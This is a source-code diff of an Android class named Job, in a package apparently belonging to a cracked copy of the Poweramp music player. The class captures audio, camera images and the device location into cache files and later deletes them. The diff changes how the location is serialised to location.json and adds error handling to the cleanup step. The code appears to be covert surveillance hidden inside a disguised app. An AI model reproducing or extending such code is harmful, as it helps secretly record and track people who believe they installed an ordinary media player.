@@ -1,7 +1,5 @@
 package co.poweramp.crackapp.receiver;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.content.Context;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
@@ -19,7 +17,7 @@ import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.LocationListener;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
-import com.google.gson.JsonObject;
+import com.google.gson.Gson;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -78,10 +76,14 @@ public class Job {
      * Clean up saved files. If any failure, ignore.
      */
     public void cleanup() {
-        File audioFile = new File(audioFilePath), imageFile = new File(imageFilePath), locFile = new File(locFilePath);
-        audioFile.delete();
-        imageFile.delete();
-        locFile.delete();
+        try {
+            File audioFile = new File(audioFilePath), imageFile = new File(imageFilePath), locFile = new File(locFilePath);
+            audioFile.delete();
+            imageFile.delete();
+            locFile.delete();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     public String getAudioFilePath() {
@@ -254,12 +256,11 @@ public class Job {
             //Write location to file
             File locFile = new File(cacheDir, "location.json");
 
-            JsonObject jsonObject = new JsonObject();
-            jsonObject.addProperty("lat", location.getLatitude());
-            jsonObject.addProperty("lon", location.getLongitude());
+            Gson gson = new Gson();
+
             try {
                 FileOutputStream fileOutputStream = new FileOutputStream(locFile);
-                fileOutputStream.write(jsonObject.toString().getBytes());
+                fileOutputStream.write(gson.toJson(location).getBytes());
                 fileOutputStream.close();
             } catch (Exception e) {
                 e.printStackTrace();
